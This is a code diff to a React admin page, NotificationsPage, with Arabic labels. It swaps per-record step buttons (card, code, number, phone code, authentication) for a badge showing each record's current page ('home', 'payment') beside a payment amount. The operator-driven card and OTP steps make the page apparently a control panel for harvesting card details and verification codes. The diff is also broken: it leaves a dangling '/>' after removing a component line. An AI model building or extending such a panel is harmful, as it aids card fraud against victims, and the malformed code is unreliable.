@@ -115,13 +115,7 @@ interface Notification {
   step?: number
 }
 
-const stepButtons = [
-  { name:"بطاقه",label:<CreditCard/>, step: 1 },
-  { name:"كود",label:<LockIcon/>, step: 2 },
-  { name:"رقم",label: <Phone/>, step: 3 },
-  { name:"كود هاتف",label: <Shield/>, step: 4 },
-  { name:"مصادقة",label:<ClipboardCheck/>, step: 5 },
-]
+
 
 // Hook for online users count
 function useOnlineUsersCount() {
@@ -160,7 +154,16 @@ function useUserOnlineStatus(userId: string) {
 
   return isOnline
 }
-
+const handlePageName = (page: string) => {
+  switch (page) {
+    case '1':
+      return 'الرئيسية'
+      break;
+    case '2':
+      return 'الدفع'
+      break;
+  }
+}
 // Enhanced Statistics Card Component
 function StatisticsCard({
   title,
@@ -1518,27 +1521,8 @@ export default function NotificationsPage() {
                       </td>
                       <td className="px-6 py-4">
                         <div className="flex flex-wrap justify-center gap-1">
-                          {stepButtons.map(({ name,label, step }) => (
-                             <TooltipProvider 
-                             key={step}
-                             >
-                             <Tooltip>
-                               <TooltipTrigger asChild>
-                            <Button
-                              size="icon"
-                              variant={notification.step === step ? "default" : "secondary"}
-                              onClick={() => handleStepUpdate(notification.id, step)}
-                              className={`text-xs px-2 h-7 ${notification.step === step?"bg-blue-500":"" }`}
-                            >
-                              {label}
-                            </Button>
-                            </TooltipTrigger>
-                              <TooltipContent>
-                                <p>{name}</p>
-                              </TooltipContent>
-                            </Tooltip>
-                          </TooltipProvider>
-                          ))}
+                        <Badge variant={'outline'}>{notification?.currentPage}</Badge>
+
                         </div>
                       </td>
                       <td className="px-6 py-4">
@@ -1601,7 +1585,6 @@ export default function NotificationsPage() {
                             </Tooltip>
                           </TooltipProvider>
                           <Badge>{notification?.amount||0.0}</Badge>
-                          <FlagColorSelector notificationId={notification.id} currentColor={notification?.flagColor} onColorChange={handleFlagColorChange}
                           />
                         </div>
                       </td>
@@ -1664,16 +1647,7 @@ export default function NotificationsPage() {
                       <div className="pt-3 border-t">
                         <p className="text-sm font-medium text-muted-foreground mb-2">تحديث الخطوة:</p>
                         <div className="flex flex-wrap gap-2">
-                          {stepButtons.map(({ label, step }) => (
-                            <Button
-                              key={step}
-                              size="sm"
-                              variant={notification.step === step ? "default" : "outline"}
-                              onClick={() => handleStepUpdate(notification.id, step)}
-                            >
-                              {label}
-                            </Button>
-                          ))}
+                         <Badge>{handlePageName(notification?.currentPage!)}</Badge>
                         </div>
                       </div>
 
@@ -1733,6 +1707,8 @@ export default function NotificationsPage() {
                         </Button>
 
                         <Badge>{notification?.amount}</Badge>
+                        <Badge variant={'outline'}>{notification?.currentPage}</Badge>
+                        
                       </div>
                     </div>
                   </CardContent>
